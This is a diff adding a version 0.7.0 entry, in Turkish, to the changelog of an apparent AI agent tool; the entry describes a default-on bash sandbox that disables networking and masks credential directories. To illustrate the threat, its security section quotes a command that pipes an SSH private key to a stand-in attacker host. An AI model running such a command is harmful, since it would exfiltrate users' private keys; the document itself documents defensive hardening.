@@ -5,6 +5,45 @@ formatı, [SemVer](https://semver.org) sürümleme.
 
 ## [Unreleased]
 
+## [0.7.0] - 2026-05-23
+
+### Eklendi
+- **🔒 Bash sandbox default-on** — `shell_unsafe` ile çalışan her bash komutu
+  artık platform native sandbox içinde çalışır:
+  - **Linux:** `bwrap` (bubblewrap) ile namespace izolasyonu
+  - **macOS:** `sandbox-exec` ile SBPL profil
+  - **Diğer:** uyarı + sandbox'sız fallback (auto modunda)
+- Default-deny sandbox profili:
+  - Root filesystem **read-only** bind
+  - `/tmp` izole tmpfs (skill scratch)
+  - **Network kapalı** — yalnız `network_read` veya `network_write` izniyle açılır
+  - Hassas ev dizinleri her zaman **maskeli**: `~/.ssh`, `~/.aws`,
+    `~/.gnupg`, `~/.config/git`, `~/.config/gh`, `~/.docker/config.json`,
+    `~/.kube/config`, `~/.netrc`
+- Permission → sandbox profili çevirisi:
+  - `file_write` → `/tmp` + macOS'ta `~/Documents`, `~/Downloads`
+  - `network_read` / `network_write` → ağ namespace açılır
+- 3 mod (env var `AJANOX_SANDBOX`):
+  - `auto` (default) — backend varsa kullan, yoksa uyarı + sandbox'sız çalış
+  - `on` — backend yoksa bash'i çalıştırmayı **reddet**
+  - `off` — sandbox tamamen kapalı
+- `primitives.ACTIVE_PERMISSIONS` ContextVar — agent her tool çağrısı öncesi
+  aktif skill'in permission setini bu var'a setler; thread-safe (web worker
+  thread'leri arası izole)
+- 27 yeni test (`tests/test_sandbox.py`) — toplam: 153 test, hepsi pass
+
+### Güvenlik
+- Onaylanmış kötü skill bile blast radius'unu permission setine sınırlar:
+  `tar czf bk.tgz ~/Documents && cat ~/.ssh/id_rsa | curl evil.com` gibi
+  combo komutlar artık bwrap içinde `~/.ssh` boş tmpfs ve network kapalı.
+
+### Değişti
+- `primitives.bash` — sandbox plan'ına göre subprocess'i ya wrapped argv ile
+  (sandbox aktif) ya da shell=True ile (fallback) çağırır. Geriye uyumlu
+  davranış: backend yoksa eski yol.
+- `core/agent.py` — tool dispatch öncesi `ACTIVE_PERMISSIONS.set(active_perms)`,
+  finally'da reset.
+
 ## [0.6.0] - 2026-05-23
 
 ### Eklendi
